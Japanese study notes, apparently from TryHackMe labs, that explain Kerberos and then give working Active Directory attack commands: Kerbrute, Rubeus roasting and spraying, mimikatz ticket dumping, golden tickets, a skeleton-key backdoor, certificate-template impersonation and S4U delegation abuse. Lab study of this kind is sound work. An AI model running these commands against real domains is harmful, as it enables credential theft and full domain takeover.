# Kerberos

https://tryhackme.com/room/attackingkerberos

## 基本

### 用語

- チケット付与チケット ( TGT ) - チケット保証チケットは、ドメインの特定のリソースに対するサービス チケットを TGS に要求するために使用される認証チケットです。
- キー配布センター (KDC) - キー配布センターは、認証サービスとチケット付与サービスで構成される TGT とサービス チケットを発行するサービスです。
- 認証サービス(AS) - 認証サービスは、ドメイン内の TGS が 他のマシンおよびサービス チケットへのアクセスを要求するために使用する TGT を発行します。
- チケット付与サービス (TGS) - チケット付与サービスは TGT を受け取り、ドメイン上のマシンにチケットを返します。
- サービス プリンシパル名 (SPN) - サービス プリンシパル名は、サービス インスタンスをドメイン サービス アカウントに関連付けるために付与される識別子です。Windows では、サービスにドメイン サービス アカウントが必要であるため、サービスには SPN を設定する必要があります。
- KDC 長期秘密鍵（KDC LT 鍵） - KDC 鍵は KRBTGT サービスアカウントに基づいています。TGT の暗号化と PAC への署名に使用されます。
- クライアント長期秘密キー（クライアント LT キー） - クライアントキーは、コンピューターまたはサービスアカウントに基づいて生成されます。暗号化されたタイムスタンプを確認し、セッションキーを暗号化するために使用されます。
- サービス長期秘密鍵（サービス LT 鍵） - サービス鍵はサービスアカウントに基づいており、サービスチケットのサービス部分を暗号化し、PAC に署名するために使用されます。
- セッションキー- TGT 発行時に KDC によって発行されます。ユーザーはサービスチケットを要求する際に、TGT と共にセッションキーを KDC に提供します。
- Privilege Attribute Certificate (PAC) - PAC にはユーザーの関連情報がすべて含まれており、 TGT とともに KDC に送信され、ターゲット LT キーと KDC LT キーによって署名されてユーザーを検証します。

### AS-REQ ステップ

1. クライアントは認証チケットまたはチケット許可チケット ( TGT ) を要求します。
2. キー配布センターはクライアントを検証し、暗号化された TGT を返します。
3. クライアントは、アクセスするサービスのサービス プリンシパル名 (SPN) とともに、 暗号化された TGT をチケット保証サーバー (TGS) に送信します。
4. キー配布センター (KDC) は、ユーザーの TGT を確認し、ユーザーがサービスにアクセスできることを確認してから、サービスの有効なセッション キーをクライアントに送信します。
5. クライアントはサービスを要求し、ユーザーがアクセスできることを証明するために有効なセッション キーを送信します。
6. サービスはアクセスを許可します

### 攻撃方法と必要条件

- Kerbrute 列挙 - ドメインアクセスは不要
- Pass the Ticket - ドメインへのユーザーとしてのアクセスが必要
- Kerberoasting - 必要なユーザーとしてアクセス
- AS-REP Roasting - 必要なユーザーとしてアクセス
- ゴールデンチケット - 完全なドメイン侵害（ドメイン管理者）が必要
- シルバーチケット - サービスハッシュが必要
- スケルトンキー - 完全なドメイン侵害（ドメイン管理者）が必要

## Kerbrute 列挙

https://github.com/ropnop/kerbrute/releases

Kerbrute 列挙は、KDC に UDP フレームを 1 つ送信するだけであるため、ログイン失敗のイベントをトリガーしない。

```sh
~/tools/kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Rubeus によるチケットの収集と総当たり攻撃

https://github.com/GhostPack/Rubeus

```ps
# 30秒毎にTGTを収集
Rubeus.exe harvest /interval:30
```

```ps
# パスワードスプレーでTGT取得。（ユーザー名は自動的に取得する）
Rubeus.exe brute /password:Password1 /noticket
```

どちらもファイル保存されたりしないので、手作業で保存する必要がある。

```ps
$b64 = Get-Clipboard | Out-String
$b64 = $b64 -replace "\s+", ""
[System.IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String($b64))
```

## Rubeus と Impacket による Kerberoasting

ケルベロースティングの目的は、サービスアカウントのパスワードを入手すること。  
認証済みアカウントが必要。  
強力なパスワードの場合、この攻撃は機能しない。  
もしサービスアカウントがドメイン管理者の場合、ゴールデンチケットを得たのと同じこと。  
防御的な観点でいえば、サービスアカウントをドメイン管理者にしてはならない。

### Rubeus

```ps
# kerberoastable なユーザーのハッシュを出力
Rubeus.exe kerberoast
```

hashcat でクラック。

```sh
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

### impacket

リモートで可

```sh
# kerberoastable なユーザーのハッシュを出力
python3 /home/kali/tools/impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.194.124 -request
```

Rubeus 同様に hashcat でクラック。

## AS-REP Roasting

サービスアカウント以外のユーザーのハッシュも入手できることが利点。  
唯一の条件は、ユーザーが Kerberos 事前認証を無効化していること。  
認証済みアカウントも必要ではない。

```ps
Rubeus.exe asreproast
```

`$krb5asrep$` の後に `23$` を挿入して、最初の行が `$krb5asrep$23$User.....` になるようにしてから、

```sh
hashcat -m 18200 hash.txt Pass.txt
```

impacket はユーザーリストを与える必要はあるが、リモートで実行できる。

```sh
GetNPUsers.py -dc-ip $TARGET controller.local/ -usersfile users.txt
```

## Pass the ticket

Pass the ticket は、マシンの LSASS メモリから TGT をダンプして使用する。  
管理者権限でコマンドプロンプトを使用する必要がある。

```cmd
mimikatz # sekurlsa::tickets /export
```

すべての.kirbi チケットが現在のディレクトリにエクスポートされる。  
krbtgt の管理者チケットがあれば、任意のサービスに対して TGS を取得し、完全な支配が可能になる。

`[0;1fc740]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`

```cmd
mimikatz # kerberos::ptt <ticket-file>
```

キャッシュされたチケットをリスト

```cmd
klist
```

ちなみに、「Rubeus によるチケットの収集と総当たり攻撃」で収集したチケットもファイル保存すれば同じように使える。

その後の例

```sh
PsExec.exe \\dc.domain.local cmd.exe

wmic /node:dc.domain.local process call create "cmd.exe /c whoami > C:\Users\Public\out.txt"

Enter-PSSession -ComputerName dc.domain.local

dir \\dc.domain.local\c$
```

## mimikatz によるゴールデン/シルバーチケット攻撃

- シルバーチケットは対象のサービス限定
- ゴールデンチケットは全ての Kerberos サービスにアクセスできる
- シルバーチケットの方がステルス性は高いので、どちらが優れているということはない

NTLM ハッシュをダンプ。SID も出力される。/name を付けなければ全員出る。

```sh
mimikatz # lsadump::lsa /inject /name:krbtgt
```

ゴールデンチケット。NTLM ハッシュと SID を指定。

```sh
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<NTLM-hash> /id:500

mimikatz # misc::cmd
```

## Backdoor（スケルトンキー）

ドメインフォレストのメモリに埋め込まれることで、マスターパスワードを持つ任意のマシンへのアクセスを可能にする。  
スケルトンキーが埋め込まれると、ドメインコントローラはユーザーの NT ハッシュと スケルトンキーの NT ハッシュの両方を使用してタイムスタンプの復号化を試み、ドメインフォレストへのアクセスを許可する。

スケルトンキーは Kerberos RC4 暗号でのみ機能する。  
mimikatz スケルトンキーのデフォルトのハッシュは `60BA4FCADC466C7A033C178194C03DF6` で、パスワードは `mimikatz`。

```
misc::skeleton
```

スケルトンキーはメモリ内のみ存在するため、永続化はしない。

その後の例

```ps
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz

dir \\Desktop-1\c$ /user:Machine1 mimikatz
```

## 証明書テンプレート

https://tryhackme.com/room/adcertificatetemplates

```ps
# 全てのテンプレートを列挙
certutil -v -template > cert_templates.txt
```

### 必要条件

#### 1. テンプレートの権限

`Allow Enroll` or `Allow Full Control`

「Allow Enroll」 キーワードを grep し、返されたグループの中にユーザーが所属するグループがないかを確認する。

#### 2. クライアント証明 EKU

証明書が Kerberos 認証に使用できる。  
`Client Authentication` という単語で grep する。

#### 3. サブジェクト別名（SAN）を指定可能

SAN を制御できる場合は、証明書を利用して任意の AD アカウント用の Kerberos チケットを実際に生成できる。  
`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` プロパティが 1 に設定されていること。

### 証明書生成（GUI）

1. `mmc（Microsoft管理コンソール）` を起動
2. File - スナップインの追加と削除
3. Certificates スナップインを追加
4. メインコンソール画面に戻り、Certificates を展開、Personal を右クリック
5. All Tasks - Request New Certificate
6. Next を 2 回
7. `「この証明書を登録するには、さらに情報が必要です。」`リンクをクリック
8. Type を `Common Name` に変更。値は任意。
9. 代替名の Type を`User Principle Name`に変更。値は、偽装するアカウントの UPN。
10. 上下の Add を押下。
11. OK を押すとリンククリック前の画面に戻り、登録可能になっている。
12. チェックして Enroll
13. メインコンソールで Personal の下の証明書を右クリック
14. All Tasks - Export
15. 道なりに進むが、PrivateKey は必ずエクスポートする。
16. 形式は PFX、パスワードは設定する。

### なりすまし

#### TGT 取得

```ps
# 形式
Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:lunar.eruca.com /dc:<IP of domain controller>

# 例
.\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.69.219
```

例

```ps
# TGTを使ってパスワード変更
.\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread

# runas
runas /user:lunar.eruca.com\<username of DA> cmd.exe
```

## Kerberos Constrained Delegation (S4U) Abuse

https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html#impacket--linux-tooling-altservice--full-s4u

bloodhound上で、DARLA_WINTERS ユーザー が HAYSTACK.THM.CORP コンピュータアカウントに対して AllowedToDelegate を持つと表示されている状態。

THM.CORP, HAYSTACK.THM.CORP は、/etc/hosts に設定しておく必要がある。

```sh
$ getST.py -k -impersonate Administrator -spn cifs/HAYSTACK.THM.CORP THM.CORP/DARLA_WINTERS

$ ls -al Admini*       
-rw-rw-r-- 1 kali kali 1657 Feb 25 11:36 Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache

$ export KRB5CCNAME=Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache

$ wmiexec.py THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass
```

背後の意味

```sh
１．Administrator が DARLA_WINTERS にアクセスする形のチケットを（DARLA_WINTERS が）要求
２．DARLA_WINTERS が Administrator の代理として cifs/HAYSTACK にアクセスすることを要求（そのときに1のチケットを提示する）
３．Administrator が HAYSTACK の CIFS にアクセスするための正式なチケット（TGS）が発行される
```
